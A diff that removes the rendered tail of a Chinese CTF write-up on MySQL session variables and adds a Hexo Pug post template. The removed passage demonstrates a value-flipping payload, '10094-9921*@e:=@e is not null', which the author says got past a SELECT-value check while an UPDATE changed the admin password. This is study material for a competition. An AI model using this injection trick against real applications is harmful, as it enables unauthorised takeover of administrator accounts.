-+-------+
-| @a:=2 |
-+-------+
-|     2 |
-+-------+
-1 row in set (0.00 sec)
-
-mysql&gt; select @a:=3;
-+-------+
-| @a:=3 |
-+-------+
-|     3 |
-+-------+
-1 row in set (0.00 sec)
-</code></pre><p>那我们能不能使用表达式给变量赋值呢？答案是可以的，我们看下面的实验</p>
-<pre><code>mysql&gt; select ID ,@rownum:=@rownum+1 as rownum from city order by ID limit 10;
-+----+--------+
-| ID | rownum |
-+----+--------+
-|  1 |     11 |
-|  2 |     12 |
-|  3 |     13 |
-|  4 |     14 |
-|  5 |     15 |
-|  6 |     16 |
-|  7 |     17 |
-|  8 |     18 |
-|  9 |     19 |
-| 10 |     20 |
-+----+--------+
-10 rows in set (0.00 sec)
-</code></pre><p>这样就实现了逐个增加，是不是很神奇？我们再来看下面的测试</p>
-<pre><code>mysql&gt; select @b:=@b is not null;
-+--------------------+
-| @b:=@b is not null |
-+--------------------+
-|                  0 |
-+--------------------+
-1 row in set (0.00 sec)
-
-mysql&gt; select @b:=@b is not null;
-+--------------------+
-| @b:=@b is not null |
-+--------------------+
-|                  1 |
-+--------------------+
-1 row in set (0.00 sec)
-</code></pre><p>这个怎么理解呢？我们先来看赋值号后面的这个表达式 </p>
-<pre><code>@b is not null
-</code></pre><p>由于 @b 并没有在当前的会话中定义过，于是一开始是 null ，然后我们做了个判断，判断 @b 不是 null ,很明显这个得到的是假，也就是 0 ,那么再执行完这个语句之后 @b 就被赋值为 0 ，当第二次再执行的时候就是判断 0 不是 Null ,这次肯定是真，于是返回1 此时 @b 就被赋值为1</p>
-<p> 那么这道题就是利用了这个点，在用户的一个会话中实现查询两次的过程中自动修改值</p>
-<p> 10094-9921*@a:=@a is not null </p>
-<pre><code>mysql&gt; select 10094-9921*@e:=@e is not null ;
-+-------------------------------+
-| 10094-9921*@e:=@e is not null |
-+-------------------------------+
-|                         10094 |
-+-------------------------------+
-1 row in set (0.00 sec)
-
-mysql&gt; select 10094-9921*@e:=@e is not null ;
-+-------------------------------+
-| 10094-9921*@e:=@e is not null |
-+-------------------------------+
-|                           173 |
-+-------------------------------+
-1 row in set (0.00 sec)
-</code></pre><p>这样达到了在绕过对 select 中的值的检查的同时在 update 修改了 admin 的密码的</p>
-<h2 id="0X06-参考"><a href="#0X06-参考" class="headerlink" title="0X06 参考"></a><strong>0X06 参考</strong></h2><p><a href="http://wupco.cn/hctf/ezphp.pdf" target="_blank" rel="noopener">http://wupco.cn/hctf/ezphp.pdf</a><br><a href="http://blog.securelayer7.net/owasp-top-10-penetration-testing-soap-application-mitigation/" target="_blank" rel="noopener">http://blog.securelayer7.net/owasp-top-10-penetration-testing-soap-application-mitigation/</a><br><a href="https://www.anquanke.com/post/id/153065#h2-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/153065#h2-5</a><br><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" target="_blank" rel="noopener">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a><br><a href="https://xz.aliyun.com/t/3336" target="_blank" rel="noopener">https://xz.aliyun.com/t/3336</a><br><a href="http://seaii-blog.com/index.php/2018/03/12/78.html" target="_blank" rel="noopener">http://seaii-blog.com/index.php/2018/03/12/78.html</a><br><a href="https://github.com/wonderkun/CTF_web/blob/master/web600-1/README.md?1520943473140" target="_blank" rel="noopener">https://github.com/wonderkun/CTF_web/blob/master/web600-1/README.md?1520943473140</a><br><a href="https://www.anquanke.com/post/id/164569" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164569</a><br><a href="https://www.cnblogs.com/backlion/p/8127868.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/8127868.html</a><br><a href="https://segmentfault.com/a/1190000009540449" target="_blank" rel="noopener">https://segmentfault.com/a/1190000009540449</a></p>
-</div><div class="tags"><a href="/tags/CTF-writeup/">CTF writeup</a></div><div class="post-nav"><a class="pre" href="/2018/12/09/Ubuntu 下编译并使用 Miracl 库/">Linux 下编译并使用 Miracl 库</a><a class="next" href="/2018/11/20/HCTF 2018 web 部分题目 详细 writeup/">HCTF 2018 web 部分题目 详细 writeup</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="https://www.k0rz3n.com"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categories</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/APT/">APT</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/C-C/">C&C</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Kerberos/">Kerberos</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/learning/">learning</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/php/">php</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web安全/">web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/wireshark/">wireshark</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/备忘/">备忘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/备忘-笔记/">备忘 笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/学习思考/">学习思考</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/">工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具使用/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/开发/">开发</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞分析/">漏洞分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞研究/">漏洞研究</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/环境搭建/">环境搭建</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/翻译/">翻译</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/论文/">论文</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/随笔/">随笔</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/PHP-备忘-笔记/" style="font-size: 15px;">PHP 备忘 笔记</a> <a href="/tags/工具-渗透测试/" style="font-size: 15px;">工具 渗透测试</a> <a href="/tags/备忘-反向代理-配置/" style="font-size: 15px;">备忘 反向代理 配置</a> <a href="/tags/开发-Github-备忘/" style="font-size: 15px;">开发 Github 备忘</a> <a href="/tags/Linux-渗透测试-备忘/" style="font-size: 15px;">Linux 渗透测试 备忘</a> <a href="/tags/配置-备忘/" style="font-size: 15px;">配置 备忘</a> <a href="/tags/编程-Python-进阶-备忘/" style="font-size: 15px;">编程 Python 进阶 备忘</a> <a href="/tags/网络安全-Python语法/" style="font-size: 15px;">网络安全 Python语法</a> <a href="/tags/gcc-备忘-笔记/" style="font-size: 15px;">gcc 备忘 笔记</a> <a href="/tags/Windows-FTP搭建-备忘/" style="font-size: 15px;">Windows FTP搭建 备忘</a> <a href="/tags/learning/" style="font-size: 15px;">learning</a> <a href="/tags/笔记/" style="font-size: 15px;">笔记</a> <a href="/tags/CTF-Tools/" style="font-size: 15px;">CTF Tools</a> <a href="/tags/学习发现/" style="font-size: 15px;">学习发现</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/kali/" style="font-size: 15px;">kali</a> <a href="/tags/SQL/" style="font-size: 15px;">SQL</a> <a href="/tags/php/" style="font-size: 15px;">php</a> <a href="/tags/php语法/" style="font-size: 15px;">php语法</a> <a href="/tags/wireshark/" style="font-size: 15px;">wireshark</a> <a href="/tags/Linux-备忘/" style="font-size: 15px;">Linux 备忘</a> <a href="/tags/编程/" style="font-size: 15px;">编程</a> <a href="/tags/备忘-shell-Linux/" style="font-size: 15px;">备忘 shell Linux</a> <a href="/tags/工具使用/" style="font-size: 15px;">工具使用</a> <a href="/tags/备忘/" style="font-size: 15px;">备忘</a> <a href="/tags/网络安全-渗透测试-内网代理/" style="font-size: 15px;">网络安全 渗透测试 内网代理</a> <a href="/tags/渗透测试-局域网扫描/" style="font-size: 15px;">渗透测试 局域网扫描</a> <a href="/tags/备忘-dcoker-getshell-CTF/" style="font-size: 15px;">备忘 dcoker getshell CTF</a> <a href="/tags/渗透测试-技巧/" style="font-size: 15px;">渗透测试 技巧</a> <a href="/tags/随笔/" style="font-size: 15px;">随笔</a> <a href="/tags/网络安全-渗透测试-sqlmap/" style="font-size: 15px;">网络安全 渗透测试 sqlmap</a> <a href="/tags/静态检测/" style="font-size: 15px;">静态检测</a> <a href="/tags/网络安全-Google-Hacking-信息收集-渗透测试/" style="font-size: 15px;">网络安全 Google Hacking 信息收集 渗透测试</a> <a href="/tags/J2EE-基础/" style="font-size: 15px;">J2EE 基础</a> <a href="/tags/前端/" style="font-size: 15px;">前端</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/web安全-漏洞-CTF/" style="font-size: 15px;">web安全  漏洞  CTF</a> <a href="/tags/APT/" style="font-size: 15px;">APT</a> <a href="/tags/渗透测试-windows-后门/" style="font-size: 15px;">渗透测试 windows 后门</a> <a href="/tags/sql/" style="font-size: 15px;">sql</a> <a href="/tags/web安全-CTF-渗透测试-PHP/" style="font-size: 15px;">web安全 CTF 渗透测试 PHP</a> <a href="/tags/CSP/" style="font-size: 15px;">CSP</a> <a href="/tags/Java-备忘-笔记/" style="font-size: 15px;">Java 备忘 笔记</a> <a href="/tags/域渗透/" style="font-size: 15px;">域渗透</a> <a href="/tags/JSONP/" style="font-size: 15px;">JSONP</a> <a href="/tags/转载/" style="font-size: 15px;">转载</a> <a href="/tags/Fuzz-XSS/" style="font-size: 15px;">Fuzz XSS</a> <a href="/tags/笔记-协议分析/" style="font-size: 15px;">笔记 协议分析</a> <a href="/tags/Redis-备忘/" style="font-size: 15px;">Redis 备忘</a> <a href="/tags/web安全-漏洞分析/" style="font-size: 15px;">web安全 漏洞分析</a> <a href="/tags/漏洞研究/" style="font-size: 15px;">漏洞研究</a> <a href="/tags/网络安全-钓鱼-恶意代码分析-漏洞分析/" style="font-size: 15px;">网络安全 钓鱼 恶意代码分析 漏洞分析</a> <a href="/tags/密码学-网络协议/" style="font-size: 15px;">密码学 网络协议</a> <a href="/tags/fuzz/" style="font-size: 15px;">fuzz</a> <a href="/tags/编程-C-类库/" style="font-size: 15px;">编程 C++ 类库</a> <a href="/tags/java-备忘/" style="font-size: 15px;">java 备忘</a> <a href="/tags/web安全-CTF/" style="font-size: 15px;">web安全 CTF</a> <a href="/tags/CTF-writeup/" style="font-size: 15px;">CTF writeup</a> <a href="/tags/编程-PHP-基础/" style="font-size: 15px;">编程 PHP 基础</a> <a href="/tags/web安全-MySQL-渗透测试/" style="font-size: 15px;">web安全 MySQL 渗透测试</a> <a href="/tags/网络安全-沙盒逃逸-Python/" style="font-size: 15px;">网络安全 沙盒逃逸 Python</a> <a href="/tags/SQL-语法/" style="font-size: 15px;">SQL 语法</a> <a href="/tags/Fuzz/" style="font-size: 15px;">Fuzz</a> <a href="/tags/爬虫/" style="font-size: 15px;">爬虫</a> <a href="/tags/XSS/" style="font-size: 15px;">XSS</a> <a href="/tags/符号执行/" style="font-size: 15px;">符号执行</a> <a href="/tags/编程-PHP-进阶/" style="font-size: 15px;">编程 PHP 进阶</a> <a href="/tags/污点分析/" style="font-size: 15px;">污点分析</a> <a href="/tags/PHP-静态检测/" style="font-size: 15px;">PHP 静态检测</a> <a href="/tags/编程-JAVA-基础/" style="font-size: 15px;">编程 JAVA 基础</a> <a href="/tags/Windows-批处理-备忘/" style="font-size: 15px;">Windows 批处理 备忘</a> <a href="/tags/SQL-注入/" style="font-size: 15px;">SQL 注入</a> <a href="/tags/流量分析/" style="font-size: 15px;">流量分析</a> <a href="/tags/编程-C-基础/" style="font-size: 15px;">编程 C++ 基础</a> <a href="/tags/编程-进阶/" style="font-size: 15px;">编程 进阶</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/05/03/Python3 爬虫知识梳理(基础篇)/">Python3 爬虫知识梳理(基础篇)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/29/New Page ,New Future/">New Page,New Future</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/20/JAVA 泛型、动态代理技术要点梳理/">JAVA 泛型、动态代理技术要点梳理</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/04/TCTF 2019 线上赛 web 题 writeup/">TCTF 2019 线上赛 web 题 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/23/2018 APT (Advanced Persistent Threat)攻击大事件/">2018 APT (Advanced Persistent Threat)攻击大事件</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/21/APT(高级持续威胁) 概念以及趋势概述/">APT(高级持续威胁) 概念以及趋势概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/19/威胁情报概念与APT事件分析模型概述/">威胁情报概念与APT事件分析模型概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/17/浅析 Kerberos 认证过程以及黄金票据和白银票据/">浅析 Kerberos 认证过程以及黄金票据和白银票据</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/13/C&C控制服务的设计和侦测方法综述(Drops from wooyun)/">C&C控制服务的设计和侦测方法综述(Drops from wooyun)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/09/如何使用 DOM XSS 来绕过 CSP 的 nonces 机制(半机翻有删增)/">如何使用 DOM XSS 来绕过 CSP 的 nonces 机制(半机翻有删增)</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="https://math1as.com/" title="math1as" target="_blank">math1as</a><ul></ul><a href="https://www.zsxsoft.com/" title="zsx" target="_blank">zsx</a><ul></ul><a href="https://www.lorexxar.cn/" title="Lorexxar" target="_blank">Lorexxar</a><ul></ul><a href="https://chybeta.github.io/" title="Chybeta" target="_blank">Chybeta</a><ul></ul><a href="http://www.cnblogs.com/iamstudy/" title="L3m0n" target="_blank">L3m0n</a><ul></ul><a href="http://www.pupiles.com" title="pupiles" target="_blank">pupiles</a><ul></ul><a href="http://f1sh.site/" title="f1sh" target="_blank">f1sh</a><ul></ul><a href="https://www.leavesongs.com/" title="phithon" target="_blank">phithon</a><ul></ul><a href="http://sh3ll.me/" title="Chu" target="_blank">Chu</a><ul></ul><a href="https://www.virzz.com/" title="Virink" target="_blank">Virink</a><ul></ul><a href="http://blog.cal1.cn/" title="超威蓝猫" target="_blank">超威蓝猫</a><ul></ul><a href="https://ricterz.me" title="RicterZ" target="_blank">RicterZ</a><ul></ul><a href="https://cyto.top/" title="Cytosine" target="_blank">Cytosine</a><ul></ul><a href="http://foreversong.cn/" title="ADog" target="_blank">ADog</a><ul></ul><a href="http://www.ckj123.com/" title="cjk123" target="_blank">cjk123</a><ul></ul><a href="http://arch0n.sumblog.cn" title="August" target="_blank">August</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">K0rz3n's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>
+    .post-content
+      != page.content
+    if theme.shareto == true
+      script(type='text/javascript', src=url_for(theme.js) + '/share.js' + '?v=' + theme.version, async)
+      a.article-share-link(data-url='#{page.permalink}', data-id='#{page._id}')= __('shareto')
+    include _partial/tag
+    include _partial/post_nav
+    if theme.duoshuo
+      div(class='ds-share flat' data-thread-key=page.path, data-title=page.title, data-url=page.permalink)
+         .ds-share-inline
+            ul.ds-share-icons-16
+              li(data-toggle='ds-share-icons-more')
+                a(class='ds-more' href='javascript:void(0);') 分享到：
+              li
+                a(class='ds-weibo' href='javascript:void(0);' data-service='weibo') 微博
+              li
+                a(class='ds-qzone' href='javascript:void(0);' data-service='qzone') QQ空间
+              li
+                a(class='ds-qqt' href='javascript:void(0);' data-service='qqt') 腾讯微博
+              li
+                a(class='ds-wechat' href='javascript:void(0);' data-service='wechat') 微信
+            .ds-share-icons-more
+    if page.comments
+      include _partial/comments
